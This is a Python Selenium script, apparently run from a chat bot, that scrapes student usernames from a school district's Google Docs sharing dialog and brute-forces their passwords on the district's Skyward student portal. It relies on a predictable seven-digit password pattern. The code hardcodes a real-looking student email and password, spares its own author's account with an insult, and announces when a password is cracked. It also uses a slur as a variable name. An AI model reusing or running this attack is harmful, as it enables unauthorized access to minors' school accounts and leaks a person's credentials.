from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException, NoSuchElementException, StaleElementReferenceException
import time

# example password (7 numbers total)
# 0947265
# 1047265

# last 4 are given via the last 4 numbers on email address
# if know last 4 and starting two than only 1 number in the middle is required to guess

# if 0 ---> 09
do_once = True
alphabet = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u",
            "v", "w", "y", "x", "z"]
starting = [10, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 20]
plainnames = []
exclude_teachers = True
correct_password = ""


def update_usernames():
    global usernames
    # add to contents of file
    if len(usernames) > 0:
        with open('usernames.txt', 'a') as file:
            for nig in usernames:
                if nig == 'arching for matches from ':
                    continue
                file.write(nig + "\n")
    else:
        with open('usernames.txt') as file:
            usernames = [line.rstrip('\n') for line in file]


def wait_for_element(driver, xpath):
    try:
        WebDriverWait(driver, 60).until(EC.presence_of_element_located((By.XPATH, xpath)))
        return True
    except TimeoutException:
        print("Loading took too much time!")
        return False


def populate_usernames():
    url = "https://docs.google.com/document/d/1njcXirfw73ZojiPZtjYfOAGSZ4qgFjTyBk1KOSBBjko/edit"
    driver = webdriver.Chrome("C:\\chromedriver.exe")
    driver.get(url)

    # google email - login - redirect neisd username - password - login - verify the account bullshit
    driver.find_element_by_xpath(
        "/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/div[2]/div/div[1]/div/form/span/section/div/div/div[1]/div/div[1]/div/div[1]/input").send_keys(
        "nmantini9528@stu.neisd.net")
    driver.find_element_by_xpath(
        "/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/div[2]/div/div[2]/div/div[1]/div").click()
    if not wait_for_element(driver, "/html/body/div[2]/div[2]/div[1]/div[2]/div/div/form/div[2]/div[1]/input"):
        return False
    driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[1]/div[2]/div/div/form/div[2]/div[1]/input").send_keys(
        "nmantini9528@stu.neisd.net")
    driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[1]/div[2]/div/div/form/div[2]/div[2]/input").send_keys(
        "0949528")
    driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[1]/div[2]/div/div/form/div[2]/div[4]/span").click()
    if not wait_for_element(driver,
                            "/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/div[2]/div/div[2]/div/div[1]/div"):
        return False
    driver.find_element_by_xpath(
        "/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/div[2]/div/div[2]/div/div[1]/div").click()

    # click share button -
    if not wait_for_element(driver, "/html/body/div[1]/div[3]/div[2]/div[1]/div[2]/div[2]/span/div"):
        return False
    driver.find_element_by_xpath("/html/body/div[1]/div[3]/div[2]/div[1]/div[2]/div[2]/span/div").click()

    driver.switch_to.default_content()
    time.sleep(3)
    driver.switch_to.frame(driver.find_element_by_xpath("//iframe[@title='Share with others']"))

    if not wait_for_element(driver, "/html/body/div[5]/div[3]/div/div[4]/div/div[1]/div[1]/div[1]/textarea"):
        return False

    xpath = "/html/body/div[6]/div[1]/div"
    letter_index = 0
    index = 1
    looped = False
    primary_letters = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "l", "o", "p", "r", "s", "t", "u"]
    primary_index = 0
    while letter_index < len(alphabet):
        # Logic:
        # First loop go A than add on B ---> Ab names
        # When we hit Ab reset to just B
        # Then repeat
        # Ba ---> Bac ----> Ca ----> Cab

        # Clear than get first letter
        driver.find_element_by_xpath("/html/body/div[5]/div[3]/div/div[4]/div/div[1]/div[1]/div[1]/textarea").clear()
        driver.find_element_by_xpath("/html/body/div[5]/div[3]/div/div[4]/div/div[1]/div[1]/div[1]/textarea").send_keys(
            alphabet[letter_index])
        time.sleep(2.5)
        while primary_index < len(primary_letters):
            while not looped:
                try:
                    block = driver.find_element_by_xpath(xpath).text
                    if not (len(block) > 1):
                        xpath = "/html/body/div[6]/div[1]/div"
                        index = 1
                        looped = True
                        break
                except (NoSuchElementException, StaleElementReferenceException) as e:
                    print(f"Exception! {e} | XPATH {xpath}")
                    xpath = "/html/body/div[6]/div[1]/div"
                    index = 1
                    looped = True
                    break

                if exclude_teachers and block.find("@neisd.net") != -1:
                    pass
                else:
                    block = block.replace("\"", "", 1)
                    plainnames.append(block[0:block.find("\"")])
                    usernames.append(block[block.find("\"") + 3:len(block) - 15])

                replaceable = index
                index += 1
                xpath = xpath.replace("]/div[" + str(replaceable) + "]", "]/div[" + str(index) + "]")

            driver.find_element_by_xpath(
                "/html/body/div[5]/div[3]/div/div[4]/div/div[1]/div[1]/div[1]/textarea").clear()
            driver.find_element_by_xpath(
                "/html/body/div[5]/div[3]/div/div[4]/div/div[1]/div[1]/div[1]/textarea").send_keys(
                alphabet[letter_index] + primary_letters[primary_index])  # + a, + b, + c
            time.sleep(1.5)
            primary_index += 1
            looped = False

        primary_index = 0
        letter_index += 1
        print(plainnames)
        print(usernames)


class Website:
    def __init__(self):
        self.url = "https://skyward.neisd.net/StudentSTS/"
        self.username = str(0)
        self.password = str(0)
        self.switch = 0
        self.index = 0

        self.driver = webdriver.Chrome("C:\\chromedriver.exe")
        self.driver.get(self.url)

    async def login(self, ctx):
        print(f"Trying {self.username} | {self.password}...")
        global do_once
        if do_once:
            wait_for_element(self.driver, "/html/body/div/div/div[2]/div/form/fieldset/input[1]")
            self.driver.find_element_by_xpath(
                "/html/body/div/div/div[2]/div/form/fieldset/input[1]").clear()  # Empty the field
            self.driver.find_element_by_xpath("/html/body/div/div/div[2]/div/form/fieldset/input[1]").send_keys(
                self.username)
            do_once = False
        self.driver.find_element_by_xpath("/html/body/div/div/div[2]/div/form/fieldset/input[2]").send_keys(
            self.password)
        self.driver.find_element_by_xpath("/html/body/div/div/div[2]/div/form/fieldset/button").click()

    def check_status(self):
        try:
            self.driver.find_element_by_xpath("/html/body/div/div/ul/li/p")
        except NoSuchElementException:
            print(f"{self.password} Worked!")
            return True

    def generate_password(self):
        if self.switch == 2:
            self.password = str(starting[2]) + str(9)  # 09
        else:
            self.password = str(starting[self.switch])  # 10

        last_four = self.username[-4:]

        if self.index == 10 and self.switch != (len(starting) - 1):
            self.index = 0
            return 2
        elif self.index == 10 and self.switch == (len(starting) - 1):
            return 0
        else:
            self.password += str(self.index) + str(last_four)
            self.index += 1
            return 1


async def main(ctx, website, username):
    name_index = 0
    print(f"Username: {username}")
    if username.find("@stu.neisd.net") != -1:
        username = username.replace("@stu.neisd.net", '')

    if username == "arching for matches from ":
        return

    do_once = True
    website.username = username
    website.generate_password()
    await website.login(ctx)
    await ctx.send("Trying combos...")

    done = False
    while not done:
        web_status = website.check_status()
        if web_status is None:
            status = website.generate_password()
            if status == 1:
                await website.login(ctx)
            elif status == 2:
                print("\nSwitching...\n")
                website.switch += 1
            elif status == 0:
                print(f"\nFailed to find password after ({len(starting * 10)} passwords) ({len(starting)} Combos)")
                await ctx.send(
                    f"\nFailed to find password after ({len(starting * 10)} passwords) ({len(starting)} Combos)")

                website.index = 0
                website.switch = 0
                done = True
        else:
            wait_for_element(website.driver, "/html/body/div[2]/div[2]/div[1]/div[7]/a")
            website.driver.find_element_by_xpath("/html/body/div[2]/div[2]/div[1]/div[7]/a").click()

            global correct_password
            correct_password = website.password
            await ctx.send("Password cracked!")

            website.index = 0
            website.switch = 0
            done = True

        name_index += 1

    website.driver.close()
    website.driver.quit()


async def run(ctx, username):
    if username == "nmantini9528" or username == "nmantini9528@stu.neisd.net":
        return "Fuck you"

    website = Website()
    time.sleep(2)
    await main(ctx, website, username)
    return correct_password
